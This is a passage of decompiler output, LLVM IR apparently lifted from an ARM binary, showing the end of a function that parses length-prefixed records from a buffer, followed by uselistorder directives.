  %v1_1bf64 = sub i32 -8, %v0_1bf10.pre
  %v2_1bf68 = add i32 %v1_1bf68, %v1_1bf64
  store i32 %v2_1bf68, i32* %r3.global-to-local, align 4
  %v3_1bf68 = icmp ult i32 %v2_1bf68, %v1_1bf64
  store i1 %v3_1bf68, i1* %cpsr_c.global-to-local, align 1
  %v8_1bf68 = icmp slt i32 %v2_1bf68, 0
  br i1 %v8_1bf68, label %dec_label_pc_1c208, label %dec_label_pc_1bf8c

dec_label_pc_1bf8c:                               ; preds = %dec_label_pc_1bf64
  %v2_1bf74 = add i32 %v2_1bf68, 12
  store i32 %v2_1bf74, i32* %r1.global-to-local, align 4
  store i32 %v2_1bf94, i32* @r5, align 4
  store i32 %v2_1bf98, i32* @r7, align 4
  store i32 %tmp160, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br i1 %v5_1c1dc57, label %dec_label_pc_1bfb0, label %dec_label_pc_1c1e0

dec_label_pc_1bfb0:                               ; preds = %dec_label_pc_1bf8c, %dec_label_pc_1c1b8.dec_label_pc_1bfb0_crit_edge
  %v0_1bfb4 = phi i32 [ %v0_1bfb4.pre, %dec_label_pc_1c1b8.dec_label_pc_1bfb0_crit_edge ], [ %v0_1bf10.pre, %dec_label_pc_1bf8c ]
  %stack_var_-460.365 = phi i32 [ %v2_1c1c0, %dec_label_pc_1c1b8.dec_label_pc_1bfb0_crit_edge ], [ %v2_1bf74, %dec_label_pc_1bf8c ]
  %stack_var_-452.062 = phi i32 [ %v1_1c1c4, %dec_label_pc_1c1b8.dec_label_pc_1bfb0_crit_edge ], [ 0, %dec_label_pc_1bf8c ]
  %stack_var_-480.261 = phi i32 [ %stack_var_-480.1, %dec_label_pc_1c1b8.dec_label_pc_1bfb0_crit_edge ], [ 1, %dec_label_pc_1bf8c ]
  store i32 256, i32* @ip, align 4
  store i32 %stack_var_-460.365, i32* @r1, align 4
  store i32 %v2_1bf94, i32* %r3.global-to-local, align 4
  %v5_1bfc8 = call i32 @function_1b9dc(i32 %v0_1bfb4, i32 %stack_var_-460.365, i32 %v4_1be40, i32 %v2_1bf94, i32 256)
  store i32 %v5_1bfc8, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1bfcc = icmp slt i32 %v5_1bfc8, 0
  br i1 %v1_1bfcc, label %dec_label_pc_1c09c, label %dec_label_pc_1bfd4

dec_label_pc_1bfd4:                               ; preds = %dec_label_pc_1bfb0
  store i32 %stack_var_-460.365, i32* %r1.global-to-local, align 4
  %v1_1bfdc = add i32 %v5_1bfc8, 10
  store i32 %v1_1bfdc, i32* @sb, align 4
  %v2_1bfe0 = sub i32 %v4_1be40, %stack_var_-460.365
  %v2_1bfe4 = sub i32 %v2_1bfe0, %v1_1bfdc
  store i32 %v2_1bfe4, i32* %r3.global-to-local, align 4
  %v3_1bfe4 = icmp uge i32 %v2_1bfe0, %v1_1bfdc
  store i1 %v3_1bfe4, i1* %cpsr_c.global-to-local, align 1
  %v8_1bfe4 = icmp slt i32 %v2_1bfe4, 0
  br i1 %v8_1bfe4, label %dec_label_pc_1c094.thread, label %dec_label_pc_1bff4

dec_label_pc_1c094.thread:                        ; preds = %dec_label_pc_1bfd4
  store i32 %v2_1bfe4, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_1c09c

dec_label_pc_1bff4:                               ; preds = %dec_label_pc_1bfd4
  %v1_1bff8 = call i32 @function_1cd20(i32 %v2_1bf94)
  %v0_1c000 = load i32, i32* @r4, align 4
  %v2_1c000 = add i32 %v0_1c000, %stack_var_-460.365
  %v0_1c004 = load i32, i32* @sl, align 4
  %v2_1c004 = add i32 %v0_1c004, %v2_1c000
  store i32 %v2_1c004, i32* %r1.global-to-local, align 4
  %v1_1c008 = add i32 %v2_1c004, 2
  store i32 %v1_1c008, i32* %ip.global-to-local, align 4
  %v1_1c00c = add i32 %v2_1c004, 4
  store i32 %v1_1c00c, i32* %r3.global-to-local, align 4
  %v1_1c010 = add i32 %v2_1c004, 5
  %v2_1c010 = inttoptr i32 %v1_1c010 to i8*
  %v3_1c010 = load i8, i8* %v2_1c010, align 1
  %v4_1c010 = zext i8 %v3_1c010 to i32
  %v1_1c018 = add i32 %v2_1c004, 8
  %v2_1c018 = inttoptr i32 %v1_1c018 to i8*
  %v3_1c018 = load i8, i8* %v2_1c018, align 1
  %v4_1c018 = zext i8 %v3_1c018 to i32
  %v1_1c024 = add i32 %v2_1c004, 6
  %v2_1c024 = inttoptr i32 %v1_1c024 to i8*
  %v3_1c024 = load i8, i8* %v2_1c024, align 1
  %v4_1c024 = zext i8 %v3_1c024 to i32
  store i32 %v4_1c024, i32* %r3.global-to-local, align 4
  %v1_1c028 = add i32 %v2_1c004, 9
  %v2_1c028 = inttoptr i32 %v1_1c028 to i8*
  %v3_1c028 = load i8, i8* %v2_1c028, align 1
  %v4_1c028 = zext i8 %v3_1c028 to i32
  %v3_1c030 = inttoptr i32 %v2_1c004 to i8*
  %v4_1c030 = load i8, i8* %v3_1c030, align 1
  %v6_1c030 = zext i8 %v4_1c030 to i32
  %v1_1c034 = add i32 %v2_1c004, 3
  %v2_1c034 = inttoptr i32 %v1_1c034 to i8*
  %v3_1c034 = load i8, i8* %v2_1c034, align 1
  %v4_1c034 = zext i8 %v3_1c034 to i32
  store i32 %v4_1c034, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v2_1c03c = inttoptr i32 %v1_1c008 to i8*
  %v3_1c03c = load i8, i8* %v2_1c03c, align 1
  %v4_1c03c = zext i8 %v3_1c03c to i32
  store i32 %v4_1c03c, i32* %ip.global-to-local, align 4
  %v1_1c040 = add i32 %v2_1c004, 1
  %v2_1c040 = inttoptr i32 %v1_1c040 to i8*
  %v3_1c040 = load i8, i8* %v2_1c040, align 1
  %v4_1c040 = zext i8 %v3_1c040 to i32
  %v4_1c044 = mul nuw nsw i32 %v4_1c018, 256
  %v5_1c044 = or i32 %v4_1c028, %v4_1c044
  store i32 %v5_1c044, i32* @r6, align 4
  store i32 %v4_1c010, i32* @r7, align 4
  %v4_1c04c = mul nuw nsw i32 %v6_1c030, 256
  %v5_1c04c = or i32 %v4_1c040, %v4_1c04c
  store i32 %v5_1c04c, i32* @lr, align 4
  %v4_1c050 = mul nuw nsw i32 %v4_1c03c, 256
  %v5_1c050 = or i32 %v4_1c050, %v4_1c034
  store i32 %v5_1c050, i32* %r3.global-to-local, align 4
  store i32 %v2_1bfe4, i32* @r5, align 4
  store i32 %v4_1c024, i32* @ip, align 4
  %v1_1c064 = add i32 %v2_1c004, 10
  store i32 %v1_1c064, i32* %r1.global-to-local, align 4
  %v1_1c068 = add i32 %v2_1c000, 10
  store i32 %v1_1c068, i32* @r4, align 4
  %v2_1c06c = sub i32 %v2_1bfe4, %v5_1c044
  %v3_1c06c = icmp uge i32 %v2_1bfe4, %v5_1c044
  store i1 %v3_1c06c, i1* %cpsr_c.global-to-local, align 1
  %tmp227 = sub i32 0, %v2_1c06c
  %v6_1c06c = and i32 %v2_1bfe4, %tmp227
  %v7_1c06c = icmp slt i32 %v6_1c06c, 0
  %v8_1c06c = icmp slt i32 %v2_1c06c, 0
  store i32 %v1_1bff8, i32* %stack_var_-144, align 4
  %v2_1c08c = xor i1 %v8_1c06c, %v7_1c06c
  br i1 %v2_1c08c, label %dec_label_pc_1c09c, label %dec_label_pc_1c094

dec_label_pc_1c094:                               ; preds = %dec_label_pc_1bff4
  %v0_1c090 = load i32, i32* @sb, align 4
  %v2_1c090 = add i32 %v0_1c090, %v5_1c044
  store i32 %v2_1c090, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1c094 = icmp slt i32 %v2_1c090, 0
  br i1 %v1_1c094, label %dec_label_pc_1c09c, label %dec_label_pc_1c0b8

dec_label_pc_1c09c:                               ; preds = %dec_label_pc_1c094, %dec_label_pc_1bff4, %dec_label_pc_1bfb0, %dec_label_pc_1c094.thread
  store i32 %stack_var_-452.062, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1c0a0 = icmp eq i32 %stack_var_-452.062, 0
  br i1 %v2_1c0a0, label %dec_label_pc_1c208, label %dec_label_pc_1c0a8

dec_label_pc_1c0a8:                               ; preds = %dec_label_pc_1c09c
  store i32 %tmp145, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1c0ac, label %dec_label_pc_1c208, label %dec_label_pc_1c1e0

dec_label_pc_1c0b8:                               ; preds = %dec_label_pc_1c094
  store i32 %stack_var_-480.261, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1c0bc = icmp eq i32 %stack_var_-480.261, 0
  br i1 %v2_1c0bc, label %dec_label_pc_1c160, label %dec_label_pc_1c0c4

dec_label_pc_1c0c4:                               ; preds = %dec_label_pc_1c0b8
  %v0_1c0c4 = load i32, i32* @fp, align 4
  %v1_1c0c4 = add i32 %v0_1c0c4, 28
  store i32 %v1_1c0c4, i32* %r3.global-to-local, align 4
  %v1_1c0c8 = inttoptr i32 %v1_1c0c4 to i32*
  %v2_1c0c8 = load i32, i32* %v1_1c0c8, align 4
  store i32 %v2_1c0c8, i32* @r3, align 4
  %v3_1c0c8 = add i32 %v0_1c0c4, 32
  %v4_1c0c8 = inttoptr i32 %v3_1c0c8 to i32*
  %v5_1c0c8 = load i32, i32* %v4_1c0c8, align 4
  store i32 %v5_1c0c8, i32* @ip, align 4
  %v6_1c0c8 = add i32 %v0_1c0c4, 36
  %v7_1c0c8 = inttoptr i32 %v6_1c0c8 to i32*
  %v8_1c0c8 = load i32, i32* %v7_1c0c8, align 4
  store i32 %v8_1c0c8, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v0_1c0c4, i32* @r0, align 4
  store i32 %v2_1bf98, i32* @r1, align 4
  %v0_1c0e4 = call i32 @function_14000()
  %v0_1c0e8 = load i32, i32* @fp, align 4
  %v1_1c0e8 = add i32 %v0_1c0e8, 4
  %v2_1c0e8 = inttoptr i32 %v1_1c0e8 to i32*
  %v3_1c0e8 = load i32, i32* %v2_1c0e8, align 4
  %v2_1c0ec = icmp ugt i32 %v3_1c0e8, 23
  store i1 %v2_1c0ec, i1* %cpsr_c.global-to-local, align 1
  %v7_1c0ec = icmp eq i32 %v3_1c0e8, 24
  br i1 %v7_1c0ec, label %dec_label_pc_1c110, label %dec_label_pc_1c0f4

dec_label_pc_1c0f4:                               ; preds = %dec_label_pc_1c0c4
  %v1_1c0f4 = add i32 %v0_1c0e8, 28
  %v2_1c0f4 = inttoptr i32 %v1_1c0f4 to i32*
  %v3_1c0f4 = load i32, i32* %v2_1c0f4, align 4
  store i32 %v3_1c0f4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1c0f8 = icmp eq i32 %v3_1c0f4, 0
  br i1 %v2_1c0f8, label %dec_label_pc_1c1e0, label %dec_label_pc_1c100

dec_label_pc_1c100:                               ; preds = %dec_label_pc_1c0f4
  store i1 %v2_1c104, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_1c104, label %dec_label_pc_1c110, label %bb228

bb228:                                            ; preds = %dec_label_pc_1c100
  store i1 %v3_1c108, i1* %cpsr_c.global-to-local, align 1
  br i1 %v8_1c108, label %dec_label_pc_1c110, label %dec_label_pc_1c1e0

dec_label_pc_1c110:                               ; preds = %dec_label_pc_1c100, %bb228, %dec_label_pc_1c0c4
  store i32 %v0_1bae8, i32* %r1.global-to-local, align 4
  %v3_1c114 = icmp uge i32 %v3_1c0e8, %v0_1bae8
  store i1 %v3_1c114, i1* %cpsr_c.global-to-local, align 1
  %v9_1c114 = icmp eq i32 %v3_1c0e8, %v0_1bae8
  br i1 %v9_1c114, label %dec_label_pc_1c124, label %bb229

bb229:                                            ; preds = %dec_label_pc_1c110
  br label %dec_label_pc_1c1b8

dec_label_pc_1c124:                               ; preds = %dec_label_pc_1c110
  store i32 %tmp160, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-452.062, i32* @r5, align 4
  %v1_1c12c = add i32 %v0_1c0e8, 16
  %v2_1c12c = inttoptr i32 %v1_1c12c to i32*
  %v3_1c12c = load i32, i32* %v2_1c12c, align 4
  %v2_1c130 = sub i32 %tmp160, %stack_var_-452.062
  %v1_1c134 = add i32 %v2_1c130, -1
  store i32 %v1_1c134, i32* %r3.global-to-local, align 4
  %v1_1c138 = add i32 %v3_1c12c, 4
  %v2_1c13c = mul i32 %v1_1c138, %v1_1c134
  store i32 %v2_1c13c, i32* %r1.global-to-local, align 4
  %v1_1c140 = add i32 %v0_1c0e8, 32
  %v2_1c140 = inttoptr i32 %v1_1c140 to i32*
  %v3_1c140 = load i32, i32* %v2_1c140, align 4
  %v3_1c144 = icmp uge i32 %v2_1c13c, %v3_1c140
  store i1 %v3_1c144, i1* %cpsr_c.global-to-local, align 1
  %v2_1c148 = add i32 %v0_1c0e8, 36
  %v3_1c148 = inttoptr i32 %v2_1c148 to i32*
  store i32 %v1_1c134, i32* %v3_1c148, align 4
  %tmp287 = icmp ugt i32 %v2_1c13c, %v3_1c140
  br i1 %tmp287, label %dec_label_pc_1c1e0, label %dec_label_pc_1c150

dec_label_pc_1c150:                               ; preds = %dec_label_pc_1c124
  store i32 0, i32* @r7, align 4
  %v1_1c158 = load i32, i32* @fp, align 4
  %v2_1c158 = add i32 %v1_1c158, 36
  %v3_1c158 = inttoptr i32 %v2_1c158 to i32*
  store i32 0, i32* %v3_1c158, align 4
  br label %dec_label_pc_1c1b8

dec_label_pc_1c160:                               ; preds = %dec_label_pc_1c0b8
  store i32 %v1_1bff8, i32* @r0, align 4
  %v0_1c164 = call i32 @function_15850()
  store i32 %v5_1c04c, i32* %r3.global-to-local, align 4
  store i32 %v0_1bae8, i32* @ip, align 4
  %v3_1c170 = icmp uge i32 %v5_1c04c, %v0_1bae8
  store i1 %v3_1c170, i1* %cpsr_c.global-to-local, align 1
  %v9_1c170 = icmp eq i32 %v5_1c04c, %v0_1bae8
  br i1 %v9_1c170, label %dec_label_pc_1c178, label %dec_label_pc_1c1b8

dec_label_pc_1c178:                               ; preds = %dec_label_pc_1c160
  %v0_1c178 = load i32, i32* @fp, align 4
  %v1_1c178 = add i32 %v0_1c178, 16
  %v2_1c178 = inttoptr i32 %v1_1c178 to i32*
  %v3_1c178 = load i32, i32* %v2_1c178, align 4
  store i32 %v3_1c178, i32* %r1.global-to-local, align 4
  store i32 %v5_1c044, i32* %r3.global-to-local, align 4
  %v3_1c180 = icmp uge i32 %v3_1c178, %v5_1c044
  store i1 %v3_1c180, i1* %cpsr_c.global-to-local, align 1
  %v9_1c180 = icmp eq i32 %v3_1c178, %v5_1c044
  br i1 %v9_1c180, label %dec_label_pc_1c194, label %dec_label_pc_1c188

dec_label_pc_1c188:                               ; preds = %dec_label_pc_1c178
  %v1_1c188 = inttoptr i32 %v0_1c178 to i32*
  %v2_1c188 = load i32, i32* %v1_1c188, align 4
  store i32 %v2_1c188, i32* @r0, align 4
  %v0_1c18c = call i32 @function_15850()
  br label %dec_label_pc_1c208

dec_label_pc_1c194:                               ; preds = %dec_label_pc_1c178
  %v1_1c194 = add i32 %v0_1c178, 36
  %v2_1c194 = inttoptr i32 %v1_1c194 to i32*
  %v3_1c194 = load i32, i32* %v2_1c194, align 4
  %v1_1c198 = add i32 %v0_1c178, 28
  %v2_1c198 = inttoptr i32 %v1_1c198 to i32*
  %v3_1c198 = load i32, i32* %v2_1c198, align 4
  store i32 %v3_1c198, i32* @r3, align 4
  %v3_1c19c = mul i32 %v3_1c194, %v5_1c044
  %v4_1c19c = add i32 %v3_1c198, %v3_1c19c
  store i32 %v4_1c19c, i32* @r0, align 4
  store i32 %v5_1c044, i32* @r2, align 4
  store i32 %v1_1c064, i32* @r1, align 4
  %v0_1c1a8 = call i32 @function_14000()
  %v0_1c1ac = load i32, i32* @fp, align 4
  %v1_1c1ac = add i32 %v0_1c1ac, 36
  %v2_1c1ac = inttoptr i32 %v1_1c1ac to i32*
  %v3_1c1ac = load i32, i32* %v2_1c1ac, align 4
  %v1_1c1b0 = add i32 %v3_1c1ac, 1
  store i32 %v1_1c1b0, i32* %r3.global-to-local, align 4
  store i32 %v1_1c1b0, i32* %v2_1c1ac, align 4
  br label %dec_label_pc_1c1b8

dec_label_pc_1c1b8:                               ; preds = %bb229, %dec_label_pc_1c160, %dec_label_pc_1c150, %dec_label_pc_1c194
  %stack_var_-480.1 = phi i32 [ 0, %dec_label_pc_1c194 ], [ 0, %dec_label_pc_1c160 ], [ 0, %dec_label_pc_1c150 ], [ 1, %bb229 ]
  %v1_1c1c0 = load i32, i32* @r4, align 4
  %v1_1c1c4 = add nuw nsw i32 %stack_var_-452.062, 1
  store i32 %v1_1c1c4, i32* %r1.global-to-local, align 4
  store i32 %tmp160, i32* %r3.global-to-local, align 4
  %v3_1c1d8 = icmp uge i32 %v1_1c1c4, %tmp160
  store i1 %v3_1c1d8, i1* %cpsr_c.global-to-local, align 1
  %v5_1c1dc = icmp slt i32 %v1_1c1c4, %tmp160
  br i1 %v5_1c1dc, label %dec_label_pc_1c1b8.dec_label_pc_1bfb0_crit_edge, label %dec_label_pc_1c1e0

dec_label_pc_1c1b8.dec_label_pc_1bfb0_crit_edge:  ; preds = %dec_label_pc_1c1b8
  %v2_1c1c0 = add i32 %v1_1c1c0, %stack_var_-460.365
  %v0_1bfb4.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_1bfb0

dec_label_pc_1c1e0:                               ; preds = %dec_label_pc_1c0a8, %dec_label_pc_1bf8c, %dec_label_pc_1c1b8, %dec_label_pc_1c0f4, %dec_label_pc_1c124, %bb228
  %v1_1c1e4 = call i32 @function_12a98(i32 %v3_1bdb8)
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1c1ec = icmp eq i32 %arg3, 0
  br i1 %v2_1c1ec, label %.thread22, label %bb231

bb231:                                            ; preds = %dec_label_pc_1c1e0
  %v1_1c1f4 = load i32, i32* @sl, align 4
  %v3_1c1f0 = inttoptr i32 %arg3 to i32*
  store i32 %v1_1c1f4, i32* %v3_1c1f0, align 4
  br label %bb232

.thread22:                                        ; preds = %dec_label_pc_1c1e0
  br label %bb232

bb232:                                            ; preds = %bb231, %.thread22
  store i32 ptrtoint (i32* @global_var_1c1fc.1110 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1c1ec, i32 ptrtoint (i32* @global_var_15850.966 to i32))
  store i32 %v1_1bb30, i32* @r0, align 4
  %v0_1c200 = call i32 @function_15850()
  br label %dec_label_pc_1c270

dec_label_pc_1c208:                               ; preds = %thread-pre-split, %dec_label_pc_1be04, %dec_label_pc_1bf64, %dec_label_pc_1bf5c, %dec_label_pc_1bf0c, %dec_label_pc_1bf18, %dec_label_pc_1bf24thread-pre-split, %thread-pre-split.thread, %dec_label_pc_1bedc, %dec_label_pc_1c0a8, %dec_label_pc_1c09c, %dec_label_pc_1bdc8, %dec_label_pc_1bda8, %dec_label_pc_1c188
  %v1_1c20c = add i32 %v0_1bccc, 1
  store i32 %v1_1c20c, i32* @r5, align 4
  br label %dec_label_pc_1c218

dec_label_pc_1c218:                               ; preds = %.thread8, %dec_label_pc_1c208
  %storemerge23 = phi i32 [ -1, %dec_label_pc_1c208 ], [ %v7_1bec8, %.thread8 ]
  %stack_var_-468.2 = phi i32 [ %v1_1c20c, %dec_label_pc_1c208 ], [ %v0_1bccc, %.thread8 ]
  store i32 %storemerge23, i32* @sb, align 4
  %v1_1c21c = add i32 %stack_var_-476.1, -1
  store i32 %v1_1c21c, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp233 = icmp slt i32 %v1_1c21c, 1
  br i1 %tmp233, label %dec_label_pc_1c238, label %dec_label_pc_1bbd0

dec_label_pc_1c230:                               ; preds = %dec_label_pc_1bd7c, %bb219, %bb214, %.thread6, %dec_label_pc_1bb4c
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_1c238

dec_label_pc_1c238:                               ; preds = %dec_label_pc_1c218, %.thread133, %dec_label_pc_1c230
  %stack_var_-472.1 = phi i32 [ %v1_1bb30, %dec_label_pc_1c230 ], [ 0, %.thread133 ], [ %v1_1bb30, %dec_label_pc_1c218 ]
  %stack_var_-488.2 = phi i32 [ -1, %dec_label_pc_1c230 ], [ -1, %.thread133 ], [ %v3_1bdb8, %dec_label_pc_1c218 ]
  %v0_1c238 = call i32 @function_17a38()
  store i32 %stack_var_-488.2, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_1c244 = icmp eq i32 %stack_var_-488.2, -1
  store i1 %v2_1c244, i1* %cpsr_c.global-to-local, align 1
  %v7_1c244 = icmp eq i32 %stack_var_-488.2, -1
  %v2_1c248 = inttoptr i32 %v0_1c238 to i32*
  store i32 -1, i32* %v2_1c248, align 4
  br i1 %v7_1c244, label %dec_label_pc_1c258, label %dec_label_pc_1c250

dec_label_pc_1c250:                               ; preds = %dec_label_pc_1c238, %dec_label_pc_1bf04
  %stack_var_-472.2 = phi i32 [ %stack_var_-472.1, %dec_label_pc_1c238 ], [ %v1_1bb30, %dec_label_pc_1bf04 ]
  %stack_var_-488.3 = phi i32 [ %stack_var_-488.2, %dec_label_pc_1c238 ], [ %v3_1bdb8, %dec_label_pc_1bf04 ]
  %v1_1c254 = call i32 @function_12a98(i32 %stack_var_-488.3)
  br label %dec_label_pc_1c258

dec_label_pc_1c258:                               ; preds = %dec_label_pc_1c238, %dec_label_pc_1c250
  %stack_var_-472.3 = phi i32 [ %stack_var_-472.1, %dec_label_pc_1c238 ], [ %stack_var_-472.2, %dec_label_pc_1c250 ]
  store i32 %stack_var_-472.3, i32* @r0, align 4
  %v0_1c25c = call i32 @function_15850()
  %v0_1c260 = load i32, i32* @sl, align 4
  store i32 %v0_1c260, i32* @r0, align 4
  %v0_1c264 = call i32 @function_15850()
  br label %dec_label_pc_1c270

dec_label_pc_1c270:                               ; preds = %bb232, %dec_label_pc_1c258
  %stack_var_-484.0 = phi i32 [ -1, %dec_label_pc_1c258 ], [ %v4_1be40, %bb232 ]
  store i32 %v3_1bad4, i32* @r4, align 4
  store i32 %v6_1bad4, i32* @r5, align 4
  store i32 %v9_1bad4, i32* @r6, align 4
  store i32 %v12_1bad4, i32* @r7, align 4
  store i32 %v15_1bad4, i32* @r8, align 4
  store i32 %v18_1bad4, i32* @sb, align 4
  store i32 %v21_1bad4, i32* @sl, align 4
  store i32 %v24_1bad4, i32* @fp, align 4
  store i32 %v27_1bad4, i32* @lr, align 4
  ret i32 %stack_var_-484.0

; uselistorder directives
  uselistorder i32 %stack_var_-488.2, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-472.1, { 1, 0 }
  uselistorder i32 %v1_1c21c, { 1, 2, 0 }
  uselistorder i32 %v1_1c1c4, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1c178, { 2, 1, 0, 3 }
  uselistorder i32 %v1_1c134, { 1, 0, 2 }
  uselistorder i32 %v2_1c06c, { 1, 0 }
  uselistorder i32 %v5_1c044, { 5, 0, 2, 3, 4, 1, 7, 6, 8 }
  uselistorder i32 %v2_1c004, { 3, 4, 0, 5, 6, 1, 2, 7, 8, 9, 10 }
  uselistorder i32 %v2_1c000, { 1, 0 }
  uselistorder i32 %v2_1bfe4, { 0, 3, 2, 4, 1, 5, 6 }
  uselistorder i32 %v2_1bfe0, { 1, 0 }
  uselistorder i32 %v1_1bfdc, { 1, 0, 2 }
  uselistorder i32 %stack_var_-452.062, { 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-460.365, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32 %v0_1bf5c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_1bf38, { 1, 0 }
  uselistorder i32 %v3_1bf2c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1bf2c, { 0, 2, 1 }
  uselistorder i32 %v2_1bf1c, { 0, 2, 1 }
  uselistorder i1 %v7_1be50, { 1, 0 }
  uselistorder i32 %v1_1be50, { 1, 0 }
  uselistorder i32 %v0_1be50, { 1, 0 }
  uselistorder i32 %v4_1be40, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v3_1bdb8, { 1, 0, 2, 9, 7, 6, 5, 8, 4, 10, 11, 3 }
  uselistorder i32 %v6_1bd70, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1bcfc, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_1bce4, { 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i32 %v1_1bcd8, { 1, 0 }
  uselistorder i32 %v0_1bccc, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-468.1, { 0, 2, 1 }
  uselistorder i32 %stack_var_-464.1, { 1, 0 }
  uselistorder i32 %v4_1bc84, { 1, 0 }
  uselistorder i1 %v7_1bbd4, { 1, 0 }
  uselistorder i32 %v1_1bbd8, { 0, 2, 1 }
  uselistorder i32 %stack_var_-468.0, { 0, 2, 1 }
  uselistorder i32 %v2_1bf94, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1bea4, { 2, 0, 1 }
  uselistorder i32 %v2_1bd2c, { 1, 0, 2 }
  uselistorder i32 %v2_1bd04, { 1, 0 }
  uselistorder i32 %v0_1bb4c, { 1, 0, 2 }
  uselistorder i32 %v1_1bb30, { 7, 0, 3, 6, 4, 8, 1, 9, 2, 5, 10, 11 }
  uselistorder i32 %v0_1bafc, { 5, 1, 3, 2, 4, 0, 6 }
  uselistorder i32 %v0_1bae8, { 10, 9, 8, 7, 6, 5, 2, 11, 0, 1, 4, 3 }
  uselistorder i16* %stack_var_-104, { 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 2, 0, 3, 1, 4 }
  uselistorder i32 %tmp160, { 3, 8, 7, 0, 6, 2, 4, 1, 5 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 18, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 51, 19, 20, 50, 1, 21, 22, 24, 25, 26, 27, 28, 23, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 35, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 27, 24, 25, 26, 28, 29, 30, 31, 32, 33, 34, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 4, 21, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 1, 19, 20, 55, 22, 23, 24, 25, 26, 54, 27, 28, 29, 30, 31, 32, 33, 34, 35, 0, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32 (i32)* @function_12a98, { 14, 13, 15, 22, 21, 20, 19, 18, 17, 16, 3, 1, 0, 2, 12, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 23, { 2, 0, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_1b9dc, { 1, 0 }
  uselistorder i32 -3, { 2, 0, 1, 3, 4 }
  uselistorder i32 192, { 0, 3, 1, 4, 2 }
  uselistorder i32 ()* @function_17a38, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_14990, { 2, 4, 3, 1, 0 }
  uselistorder i32 64, { 2, 10, 0, 7, 11, 5, 8, 9, 6, 1, 3, 12, 13, 4 }
  uselistorder i32 1000, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @function_149c8, { 8, 11, 7, 6, 5, 4, 10, 9, 2, 1, 0, 3 }
  uselistorder i32 (i32, i32, i32)* @function_148dc, { 0, 5, 4, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @function_14a84, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 17, { 1, 12, 2, 6, 3, 7, 4, 8, 5, 9, 0, 11, 13, 10 }
  uselistorder i32 76, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 14 }
  uselistorder i32 27, { 2, 1, 0, 3 }
  uselistorder i8 46, { 3, 2, 0, 4, 1, 5 }
  uselistorder i8 45, { 3, 1, 4, 2, 0, 5, 6, 7 }
  uselistorder i32 27304, { 1, 0, 2 }
  uselistorder i32 130, { 1, 0 }
  uselistorder i32 512, { 3, 11, 2, 12, 1, 13, 14, 15, 16, 9, 0, 4, 8, 7, 6, 10, 5 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1c270, { 1, 0 }
  uselistorder label %dec_label_pc_1c258, { 1, 0 }
  uselistorder label %dec_label_pc_1c238, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1c230, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_1c218, { 1, 0 }
  uselistorder label %dec_label_pc_1c208, { 13, 9, 10, 2, 3, 6, 5, 4, 8, 0, 7, 1, 11, 12 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %dec_label_pc_1c1e0, { 2, 4, 5, 3, 0, 1 }
  uselistorder label %dec_label_pc_1c1b8, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1c110, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1c09c, { 0, 1, 3, 2 }
